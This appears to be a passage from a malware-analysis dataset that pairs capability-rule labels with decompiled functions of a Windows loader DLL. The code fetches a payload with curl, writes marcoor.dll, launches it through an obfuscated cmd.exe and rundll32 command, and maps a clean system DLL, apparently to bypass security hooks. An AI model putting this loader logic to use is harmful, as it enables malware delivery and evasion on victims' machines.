            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180004830(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    ushort uStack704;\n    ushort uStack702;\n    ushort uStack700;\n    ushort uStack698;\n    ushort uStack696;\n    ushort uStack694;\n    ushort uStack692;\n    ushort uStack690;\n    ushort uStack688;\n    ushort uStack686;\n    ushort uStack684;\n    ushort uStack682;\n    ushort uStack680;\n    ushort uStack678;\n    ushort uStack676;\n    ushort uStack674;\n    ushort uStack672;\n    ushort uStack670;\n    ushort uStack668;\n    ushort uStack666;\n    ushort uStack664;\n    ushort uStack662;\n    ushort uStack660;\n    ushort uStack658;\n    ushort uStack656;\n    ushort uStack654;\n    ushort uStack652;\n    ushort uStack650;\n    ushort uStack648;\n    ushort uStack646;\n    ushort uStack644;\n    ushort uStack642;\n    ushort uStack640;\n    ushort uStack638;\n    ushort uStack636;\n    ushort uStack634;\n    ushort uStack632;\n    ushort uStack630;\n    ushort uStack628;\n    ushort uStack626;\n    ushort uStack624;\n    ushort uStack622;\n    ushort uStack620;\n    ushort uStack618;\n    ushort uStack616;\n    ushort uStack614;\n    ushort uStack612;\n    ushort uStack610;\n    ushort uStack608;\n    ushort uStack606;\n    ushort uStack604;\n    ushort uStack602;\n    ushort uStack600;\n    ushort uStack598;\n    ushort uStack596;\n    ushort uStack594;\n    ushort uStack592;\n    ushort uStack590;\n    ushort uStack588;\n    ushort uStack586;\n    ushort uStack584;\n    ushort uStack582;\n    ushort uStack580;\n    ushort uStack578;\n    ushort uStack576;\n    ushort uStack574;\n    ushort uStack572;\n    ushort uStack570;\n    ushort uStack568;\n    ushort uStack566;\n    ushort uStack564;\n    ushort uStack562;\n    uint auStack552 [2];\n    ulong uStack544;\n    uchar auStack536 [528];\n    \n    uStack680 = 0x53;\n    uStack678 = 0x4f;\n    uStack676 = 0x46;\n    uStack674 = 0x54;\n    uStack672 = 0x57;\n    uStack670 = 0x41;\n    uStack668 = 0x52;\n    uStack666 = 0x45;\n    uStack664 = 0x5c;\n    uStack662 = 0x4d;\n    uStack660 = 0x69;\n    uStack658 = 99;\n    uStack656 = 0x72;\n    uStack654 = 0x6f;\n    uStack652 = 0x73;\n    uStack650 = 0x6f;\n    uStack648 = 0x66;\n    uStack646 = 0x74;\n    uStack644 = 0x5c;\n    uStack642 = 0x57;\n    uStack640 = 0x69;\n    uStack638 = 0x6e;\n    uStack636 = 100;\n    uStack634 = 0x6f;\n    uStack632 = 0x77;\n    uStack630 = 0x73;\n    uStack628 = 0x5c;\n    uStack626 = 0x43;\n    uStack624 = 0x75;\n    uStack622 = 0x72;\n    uStack620 = 0x72;\n    uStack618 = 0x65;\n    uStack616 = 0x6e;\n    uStack614 = 0x74;\n    uStack612 = 0x56;\n    uStack610 = 0x65;\n    uStack608 = 0x72;\n    uStack606 = 0x73;\n    uStack604 = 0x69;\n    uStack602 = 0x6f;\n    uStack600 = 0x6e;\n    uStack598 = 0x5c;\n    uStack596 = 0x49;\n    uStack594 = 0x6e;\n    uStack592 = 0x74;\n    uStack590 = 0x65;\n    uStack588 = 0x72;\n    uStack586 = 0x6e;\n    uStack584 = 0x65;\n    uStack582 = 0x74;\n    uStack580 = 0x20;\n    uStack578 = 0x53;\n    uStack576 = 0x65;\n    uStack574 = 0x74;\n    uStack572 = 0x74;\n    uStack570 = 0x69;\n    uStack568 = 0x6e;\n    uStack566 = 0x67;\n    uStack564 = 0x73;\n    uStack562 = 0;\n    uStack704 = 0x50;\n    uStack702 = 0x72;\n    uStack700 = 0x6f;\n    uStack698 = 0x78;\n    uStack696 = 0x79;\n    uStack694 = 0x53;\n    uStack692 = 0x65;\n    uStack690 = 0x72;\n    uStack688 = 0x76;\n    uStack686 = 0x65;\n    uStack684 = 0x72;\n    uStack682 = 0;\n    iVar1 = (**0x18002ce18)(0xffffffff80000001, &uStack680, 0, 0x20019, &uStack544);\n    if (iVar1 == 0) {\n        auStack552[0] = 0x104;\n        puVar4 = auStack536;\n        for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        iVar1 = (**0x18002cd68)(uStack544, &uStack704, 0, 0, auStack536, auStack552);\n        if (iVar1 == 0) {\n            (*_sym.imp.USER32.dll_CharToOemW)(auStack536, arg1);\n            (**0x18002cd50)(uStack544);\n            uVar2 = 1;\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 1480
    },
    "180004c5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180004c50(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uchar *puVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uchar *puVar8;\n    uchar *in_R9;\n    uchar *puVar9;\n    int64_t iStackX16;\n    int64_t aiStackX24 [2];\n    ulong uStack24;\n    \n    uStack24 = 0x180004c61;\n    iVar3 = fcn.18001df20();\n    iVar3 = -iVar3;\n    puVar9 = &stack0x00000198 + iVar3;\n    for (iVar7 = 0x1e; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &stack0x000017a0 + iVar3;\n    for (iVar7 = 0x824; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &stack0x00000730 + iVar3;\n    for (iVar7 = 0x82e; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *(&stack0xffffffffffffffe8 + iVar3) = 0x180004cad;\n    iVar1 = fcn.180004830(&stack0x00000198 + iVar3);\n    if (iVar1 == 1) {\n        in_R9 = &stack0x00000198 + iVar3;\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180004cd6;\n        fcn.180003310(&stack0x000017a0 + iVar3, \"%s -x %s\", *(&stack0x00003090 + iVar3), in_R9);\n    }\n    else {\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180004cf4;\n        fcn.180003310(&stack0x000017a0 + iVar3, 0x180027994, *(&stack0x00003090 + iVar3), in_R9);\n    }\n    if ((*0x18002cf44 == 1) || (*0x18002ce6c == 1)) {\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180004d22;\n        fcn.180003310(&stack0x00000730 + iVar3, \"curl -A cur1-agent -L %s -s -d da\", &stack0x000017a0 + iVar3, in_R9);\n    }\n    else {\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180004d40;\n        fcn.180003310(&stack0x00000730 + iVar3, \"curl -A cur1-agent -L %s -s -d dl\", &stack0x000017a0 + iVar3, in_R9);\n    }\n    puVar9 = &stack0x00000158 + iVar3;\n    for (iVar7 = 0x18; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *(&stack0x00000158 + iVar3) = 0x18;\n    *(&stack0x00000168 + iVar3) = 1;\n    *(&stack0x00000160 + iVar3) = 0;\n    puVar9 = 0x3200000;\n    *(&stack0xffffffffffffffe8 + iVar3) = 0x180004d9a;\n    (**0x18002ce00)(&stack0x00000070 + iVar3, &stack0x000000a0 + iVar3);\n    *(&stack0xffffffffffffffe8 + iVar3) = 0x180004db0;\n    (**0x18002cd38)(*(&stack0x00000070 + iVar3), 1);\n    puVar5 = &stack0x00000100 + iVar3;\n    for (iVar7 = 0x18; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    puVar5 = &stack0x000001e0 + iVar3;\n    for (iVar7 = 0x68; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *(&stack0x00000220 + iVar3) = 0;\n    *(&stack0x000001e0 + iVar3) = 0x68;\n    *(&stack0x00000230 + iVar3) = 0;\n    *(&stack0x00000240 + iVar3) = *(&stack0x000000a0 + iVar3);\n    *(&stack0x00000238 + iVar3) = *(&stack0x000000a0 + iVar3);\n    *(&stack0x0000021c + iVar3) = *(&stack0x0000021c + iVar3) | 0x100;\n    *(&stack0x00000048 + iVar3) = 0;\n    *(&stack0x00000068 + iVar3) = 0;\ncode_r0x000180004e47:\n    do {\n        do {\n            while ((*0x18002ce6c != 1 && (*0x18002ce74 != 1))) {\n                *(&stack0x00000038 + iVar3) = &stack0x00000100 + iVar3;\n                *(&stack0x00000030 + iVar3) = &stack0x000001e0 + iVar3;\n                *(&stack0x00000028 + iVar3) = 0;\n                *(&stack0x00000020 + iVar3) = 0;\n                *(&stack0x00000018 + iVar3) = 0x8000000;\n                *(&stack0x00000010 + iVar3) = 1;\n                puVar9 = NULL;\n                *(&stack0xffffffffffffffe8 + iVar3) = 0x18000512f;\n                uVar2 = (**0x18002cdf0)(0, &stack0x00000730 + iVar3);\n                *(&stack0x00000068 + iVar3) = uVar2;\n                if (*(&stack0x00000068 + iVar3) == 0) {\n                    *(&stack0xffffffffffffffe8 + iVar3) = 0x18000518c;\n                    (*_sym.imp.KERNEL32.dll_Sleep)();\n                }\n                else {\n                    *(&stack0xffffffffffffffe8 + iVar3) = 0x18000514d;\n                    (**0x18002cdb8)(*(&stack0x00000100 + iVar3), 0xffffffff);\n                    if (*(&stack0x00000100 + iVar3) != 0) {\n                        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005166;\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(&stack0x00000100 + iVar3));\n                    }\n                    if (*(&stack0x00000108 + iVar3) != 0) {\n                        *(&stack0xffffffffffffffe8 + iVar3) = 0x18000517f;\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(&stack0x00000108 + iVar3));\n                    }\n                    *(&stack0xffffffffffffffe8 + iVar3) = 0x1800051a1;\n                    uVar2 = (**0x18002cdd8)(*(&stack0x00000070 + iVar3), 0);\n                    *(&stack0x00000050 + iVar3) = uVar2;\n                    if (*(&stack0x00000050 + iVar3) == 0) {\n                        *(&stack0xffffffffffffffe8 + iVar3) = 0x1800051b7;\n                        (*_sym.imp.KERNEL32.dll_Sleep)();\n                    }\n                    else {\n                        *(&stack0xffffffffffffffe8 + iVar3) = 0x1800051c5;\n                        uVar4 = fcn.180003e40(*(&stack0x00000050 + iVar3));\n                        *(&stack0x00000048 + iVar3) = uVar4;\n                        *(&stack0x00000010 + iVar3) = 0;\n                        puVar9 = &stack0x00000148 + iVar3;\n                        *(&stack0xffffffffffffffe8 + iVar3) = 0x1800051f3;\n                        (**0x18002cd40)(*(&stack0x00000070 + iVar3), *(&stack0x00000048 + iVar3));\n                        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005204;\n                        iVar7 = fcn.180003390(*(&stack0x00000048 + iVar3), \"<html>\");\n                        if (iVar7 == 0) {\n                            *(&stack0xffffffffffffffe8 + iVar3) = 0x18000521a;\n                            iVar7 = fcn.180003390(*(&stack0x00000048 + iVar3), \"curl: \");\n                            if (iVar7 != 0) goto code_r0x00018000521f;\n                            goto code_r0x000180005236;\n                        }\ncode_r0x00018000521f:\n                        *(&stack0xffffffffffffffe8 + iVar3) = 0x18000522a;\n                        (*_sym.imp.KERNEL32.dll_Sleep)();\n                    }\n                }\n            }\n            if (*(&stack0x00003090 + iVar3) == 0) {\ncode_r0x000180004ec6:\n                *(&stack0x000000b8 + iVar3) = *(&stack0x00003090 + iVar3);\n                *(&stack0x00000078 + iVar3) = &stack0x00000730 + iVar3;\n                *(&stack0x00000190 + iVar3) = *(&stack0x00000078 + iVar3);\n                do {\n                    (&stack0x00000040)[iVar3] = **(&stack0x000000b8 + iVar3);\n                    **(&stack0x00000078 + iVar3) = (&stack0x00000040)[iVar3];\n                    *(&stack0x000000b8 + iVar3) = *(&stack0x000000b8 + iVar3) + 1;\n                    *(&stack0x00000078 + iVar3) = *(&stack0x00000078 + iVar3) + 1;\n                } while ((&stack0x00000040)[iVar3] != '\\0');\n            }\n            else {\n                *(&stack0xffffffffffffffe8 + iVar3) = 0x180004e8d;\n                iVar1 = fcn.18000dea0(*(&stack0x00003090 + iVar3), 0x1800279c4, 4);\n                if (iVar1 == 0) goto code_r0x000180004ec6;\n                *(&stack0x00000150 + iVar3) = str.http:__;\n                puVar9 = *(&stack0x00003090 + iVar3);\n                *(&stack0xffffffffffffffe8 + iVar3) = 0x180004ec4;\n                fcn.180003310(&stack0x00000730 + iVar3, 0x1800279d8, &stack0x00000150 + iVar3, puVar9);\n            }\n            *(&stack0x00000060 + iVar3) = 0;\n            *(&stack0x000000c0 + iVar3) = 0;\n            *(&stack0x00000064 + iVar3) = 0;\n            *(&stack0x00000118 + iVar3) = &stack0x00000730 + iVar3;\n            *(&stack0x00000080 + iVar3) = 0xffffffffffffffff;\n            do {\n                *(&stack0x00000080 + iVar3) = *(&stack0x00000080 + iVar3) + 1;\n            } while (*(*(&stack0x00000118 + iVar3) + *(&stack0x00000080 + iVar3)) != '\\0');\n            if (*(&stack0x00000080 + iVar3) != 0) {\n                puVar9 = &stack0x00002840 + iVar3;\n                for (iVar7 = 0x824; iVar7 != 0; iVar7 = iVar7 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                puVar9 = &stack0x000000d0 + iVar3;\n                for (iVar7 = 10; iVar7 != 0; iVar7 = iVar7 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                if ((*0x18002ce6c == 1) || (*0x18002cf44 == 1)) {\n                    puVar9 = 0x1800279b4;\n                    puVar5 = &stack0x000000d0 + iVar3;\n                    for (iVar7 = 3; iVar7 != 0; iVar7 = iVar7 + -1) {\n                        *puVar5 = *puVar9;\n                        puVar9 = puVar9 + 1;\n                        puVar5 = puVar5 + 1;\n                    }\n                }\n                else {\n                    puVar9 = 0x1800279cc;\n                    puVar5 = &stack0x000000d0 + iVar3;\n                    for (iVar7 = 3; iVar7 != 0; iVar7 = iVar7 + -1) {\n                        *puVar5 = *puVar9;\n                        puVar9 = puVar9 + 1;\n                        puVar5 = puVar5 + 1;\n                    }\n                }\n                *(&stack0x00000120 + iVar3) = &stack0x000000d0 + iVar3;\n                *(&stack0x00000088 + iVar3) = 0xffffffffffffffff;\n                do {\n                    *(&stack0x00000088 + iVar3) = *(&stack0x00000088 + iVar3) + 1;\n                } while (*(*(&stack0x00000120 + iVar3) + *(&stack0x00000088 + iVar3)) != '\\0');\n                *(&stack0x00000020 + iVar3) = &stack0x00002840 + iVar3;\n                *(&stack0x00000018 + iVar3) = &stack0x00000064 + iVar3;\n                *(&stack0x00000010 + iVar3) = &stack0x000000c0 + iVar3;\n                puVar9 = NULL;\n                *(&stack0xffffffffffffffe8 + iVar3) = 0x18000509d;\n                uVar2 = fcn.180008800(&stack0x00000730 + iVar3, &stack0x000000d0 + iVar3, \n                                      *(&stack0x00000088 + iVar3) & 0xffffffff, 0);\n                *(&stack0x00000060 + iVar3) = uVar2;\n            }\n        } while (((*(&stack0x00000060 + iVar3) == 0) || (*(&stack0x000000c0 + iVar3) == 0)) ||\n                (*(&stack0x00000064 + iVar3) == 0));\n        *(&stack0x00000048 + iVar3) = *(&stack0x000000c0 + iVar3);\ncode_r0x000180005236:\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005243;\n        fcn.180006d40(&stack0x000000e0 + iVar3);\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005256;\n        fcn.180006eb0(&stack0x000001b8 + iVar3, *(&stack0x00000048 + iVar3));\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x18000526c;\n        uVar4 = fcn.180003890(&stack0x00000250 + iVar3, &stack0x000001b8 + iVar3);\n        *(&stack0x00000128 + iVar3) = uVar4;\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005289;\n        fcn.180006be0(&stack0x000000e0 + iVar3, *(&stack0x00000128 + iVar3));\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005296;\n        fcn.180006bc0(&stack0x00000250 + iVar3);\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x1800052a4;\n        fcn.180006e80(&stack0x000001b8 + iVar3);\n        puVar5 = &stack0x00000270 + iVar3;\n        for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x1800052c5;\n        puVar5 = fcn.180006a40(&stack0x000000e0 + iVar3);\n        puVar8 = &stack0x00000270 + iVar3;\n        for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar8 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x1800052e7;\n        iVar1 = fcn.180006a10(&stack0x000000e0 + iVar3);\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x1800052f1;\n        uVar4 = fcn.180003e40(iVar1 - 0x40);\n        *(&stack0x00000058 + iVar3) = uVar4;\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005303;\n        iVar1 = fcn.180006a10(&stack0x000000e0 + iVar3);\n        *(&stack0x00000054 + iVar3) = iVar1 + -0x40;\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005317;\n        iVar7 = fcn.180006a10(&stack0x000000e0 + iVar3);\n        *(&stack0x00000130 + iVar3) = iVar7 + -0x40;\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005330;\n        iVar6 = fcn.180006a40(&stack0x000000e0 + iVar3);\n        puVar5 = iVar6 + 0x40;\n        puVar8 = *(&stack0x00000058 + iVar3);\n        for (iVar7 = *(&stack0x00000130 + iVar3); iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar8 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x18000535f;\n        fcn.180003e90(*(&stack0x00000058 + iVar3), *(&stack0x00000054 + iVar3), &stack0x00000270 + iVar3);\n        puVar5 = &stack0x00001fd0 + iVar3;\n        for (iVar7 = 0x864; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005387;\n        iVar7 = fcn.180003390(*(&stack0x00003090 + iVar3), \"http\");\n        if (iVar7 == 0) {\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x1800053a8;\n            fcn.180003310(&stack0x00001fd0 + iVar3, \"http://%s\", *(&stack0x00003090 + iVar3), puVar9);\n        }\n        else {\n            *(&stack0x000000c8 + iVar3) = *(&stack0x00003090 + iVar3);\n            *(&stack0x00000090 + iVar3) = &stack0x00001fd0 + iVar3;\n            *(&stack0x00000188 + iVar3) = *(&stack0x00000090 + iVar3);\n            do {\n                (&stack0x00000041)[iVar3] = **(&stack0x000000c8 + iVar3);\n                **(&stack0x00000090 + iVar3) = (&stack0x00000041)[iVar3];\n                *(&stack0x000000c8 + iVar3) = *(&stack0x000000c8 + iVar3) + 1;\n                *(&stack0x00000090 + iVar3) = *(&stack0x00000090 + iVar3) + 1;\n            } while ((&stack0x00000041)[iVar3] != '\\0');\n        }\n        if ((*0x18002cf44 != 1) && (*0x18002ce6c != 1)) {\n            *(&stack0x00000140 + iVar3) = &stack0x00001fd0 + iVar3;\n            *(&stack0x00000098 + iVar3) = 0xffffffffffffffff;\n            do {\n                *(&stack0x00000098 + iVar3) = *(&stack0x00000098 + iVar3) + 1;\n            } while (*(*(&stack0x00000140 + iVar3) + *(&stack0x00000098 + iVar3)) != '\\0');\n            puVar9 = *(&stack0x00000098 + iVar3) & 0xffffffff;\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x1800056d4;\n            uVar2 = fcn.180004780(*(&stack0x00000058 + iVar3), *(&stack0x00000054 + iVar3), &stack0x00001fd0 + iVar3, \n                                  puVar9);\n            *(&stack0x000000a8 + iVar3) = uVar2;\n            if (*(&stack0x00000058 + iVar3) != 0) {\n                *(&stack0xffffffffffffffe8 + iVar3) = 0x1800056ed;\n                fcn.180010754(*(&stack0x00000058 + iVar3));\n            }\n            if (*(&stack0x000000a8 + iVar3) != 0) goto code_r0x000180005715;\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x180005702;\n            (*_sym.imp.KERNEL32.dll_Sleep)(30000);\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x180005710;\n            fcn.180006bc0(&stack0x000000e0 + iVar3);\n            goto code_r0x000180004e47;\n        }\n        puVar9 = &stack0x00000f60 + iVar3;\n        for (iVar7 = 0x410; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        uVar4 = 0;\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005468;\n        (**0x18002ce40)(0, &stack0x00000f60 + iVar3, 0x15);\n        puVar9 = &stack0x00000320 + iVar3;\n        for (iVar7 = 0x410; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005498;\n        fcn.1800031f0(&stack0x00000320 + iVar3, L\"%s\\\\marcoor.dll\", &stack0x00000f60 + iVar3, uVar4);\n        *(&stack0x00000020 + iVar3) = 0;\n        *(&stack0x00000018 + iVar3) = 0;\n        *(&stack0x00000010 + iVar3) = 2;\n        puVar9 = NULL;\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x1800054ca;\n        uVar4 = (**0x18002ce60)(&stack0x00000320 + iVar3, 0x40000000);\n        *(&stack0x000000b0 + iVar3) = uVar4;\n        if (*(&stack0x000000b0 + iVar3) == -1) {\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x1800054e7;\n            fcn.180004750(30000);\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x1800054f5;\n            fcn.180006bc0(&stack0x000000e0 + iVar3);\n        }\n        else {\n            *(&stack0x00000010 + iVar3) = 0;\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x180005523;\n            (*_sym.imp.KERNEL32.dll_WriteFile)\n                      (*(&stack0x000000b0 + iVar3), *(&stack0x00000058 + iVar3), *(&stack0x00000054 + iVar3), \n                       &stack0x0000014c + iVar3);\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x180005531;\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(*(&stack0x000000b0 + iVar3));\n            puVar9 = &stack0x00001370 + iVar3;\n            for (iVar7 = 0x424; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x180005551;\n            uVar4 = fcn.18001074c(L\"SYSTEMROOT\");\n            *(&stack0x00000138 + iVar3) = uVar4;\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x180005565;\n            uVar4 = fcn.18001074c(L\"PUBLIC\");\n            *(&stack0x000000f8 + iVar3) = uVar4;\n            *(&stack0x00000020 + iVar3) = &stack0x00001fd0 + iVar3;\n            *(&stack0x00000018 + iVar3) = &stack0x00000320 + iVar3;\n            *(&stack0x00000010 + iVar3) = *(&stack0x000000f8 + iVar3);\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x1800055b8;\n            fcn.1800031f0(&stack0x00001370 + iVar3, \n                          L\"cmd.exe /c copy /b %s\\\\system32\\\\rund^ll3^2.e^xe %s\\\\rdl.e^xe & %s\\\\rdl.ex^e %s #1 %S\", \n                          *(&stack0x00000138 + iVar3), *(&stack0x000000f8 + iVar3));\n            puVar9 = &stack0x000002b0 + iVar3;\n            for (iVar7 = 0x68; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            *(&stack0x00000038 + iVar3) = &stack0x00000170 + iVar3;\n            *(&stack0x00000030 + iVar3) = &stack0x000002b0 + iVar3;\n            *(&stack0x00000028 + iVar3) = 0;\n            *(&stack0x00000020 + iVar3) = 0;\n            *(&stack0x00000018 + iVar3) = 0x8000000;\n            *(&stack0x00000010 + iVar3) = 0;\n            puVar9 = NULL;\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x18000561e;\n            iVar1 = (**0x18002cd48)(0, &stack0x00001370 + iVar3);\n            if (iVar1 != 0) {\n                if (*(&stack0x00000170 + iVar3) != 0) {\n                    *(&stack0xffffffffffffffe8 + iVar3) = 0x18000565b;\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(*(&stack0x00000170 + iVar3));\n                }\n                if (*(&stack0x00000178 + iVar3) != 0) {\n                    *(&stack0xffffffffffffffe8 + iVar3) = 0x180005674;\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(*(&stack0x00000178 + iVar3));\n                }\ncode_r0x000180005715:\n                *(&stack0xffffffffffffffe8 + iVar3) = 0x180005722;\n                fcn.180006bc0(&stack0x000000e0 + iVar3);\n                if (*(&stack0x00000070 + iVar3) != 0) {\n                    *(&stack0xffffffffffffffe8 + iVar3) = 0x18000574f;\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(*(&stack0x00000070 + iVar3));\n                }\n                if (*(&stack0x000000a0 + iVar3) != 0) {\n                    *(&stack0xffffffffffffffe8 + iVar3) = 0x180005768;\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(*(&stack0x000000a0 + iVar3));\n                }\n                if (*(&stack0x00000048 + iVar3) != 0) {\n                    *(&stack0xffffffffffffffe8 + iVar3) = 0x18000577a;\n                    fcn.180010754(*(&stack0x00000048 + iVar3));\n                }\n                return;\n            }\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x18000562d;\n            (*_sym.imp.KERNEL32.dll_Sleep)(30000);\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x18000563b;\n            fcn.180006bc0(&stack0x000000e0 + iVar3);\n        }\n    } while( true );\n}\n",
        "token_count": 7075
    },
    "18000579": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180005790(ulong arg1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uchar *puVar8;\n    int64_t *piVar9;\n    uchar *puVar10;\n    ulong in_stack_fffffffffffffd28;\n    uint uVar11;\n    uint64_t in_stack_fffffffffffffd30;\n    uint16_t uStack696;\n    uint auStack680 [2];\n    int64_t iStack672;\n    int64_t iStack664;\n    int64_t iStack656;\n    int64_t iStack648;\n    ulong uStack640;\n    uint uStack632;\n    int64_t iStack624;\n    int64_t iStack616;\n    int64_t iStack608;\n    int64_t aiStack600 [4];\n    uchar auStack568 [272];\n    uchar auStack296 [280];\n    \n    uVar11 = in_stack_fffffffffffffd28 >> 0x20;\n    uStack640 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    piVar9 = aiStack600;\n    for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *piVar9 = 0;\n        piVar9 = piVar9 + 1;\n    }\n    iStack616 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(arg1);\n    puVar8 = auStack568;\n    for (iVar6 = 0x104; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    puVar8 = auStack296;\n    for (iVar6 = 0x104; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack568, 0x104);\n    fcn.180003310(auStack296, \"%s\\\\%s\", auStack568, arg1);\n    iStack672 = 0;\n    iStack664 = 0;\n    iStack656 = 0;\n    iStack648 = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_K32GetModuleInformation)(uStack640, iStack616, aiStack600, 0x18);\n    if ((iVar2 != 0) && (iStack672 = aiStack600[0],  aiStack600[0] != 0)) {\n        uVar7 = CONCAT44(uVar11, 3);\n        iStack664 = (*_sym.imp.KERNEL32.dll_CreateFileA)\n                              (auStack296, 0x80000000, 1, 0, uVar7, in_stack_fffffffffffffd30 & 0xffffffff00000000, 0);\n        if ((iStack664 != -1) &&\n           ((iStack656 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)\n                                   (iStack664, 0, 0x1000002, 0, uVar7 & 0xffffffff00000000, 0),  iStack656 != 0 &&\n            (iStack648 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(iStack656, 4, 0, 0, 0),  iStack648 != 0)))) {\n            iStack608 = iStack672;\n            iStack624 = iStack672 + *(iStack672 + 0x3c);\n            for (uStack696 = 0; uStack696 < *(iStack624 + 6); uStack696 = uStack696 + 1) {\n                puVar4 = iStack624 + 0x18 + *(iStack624 + 0x14) + uStack696 * 0x28;\n                puVar5 = puVar4;\n                do {\n                    uVar1 = *puVar5;\n                    if (uVar1 != 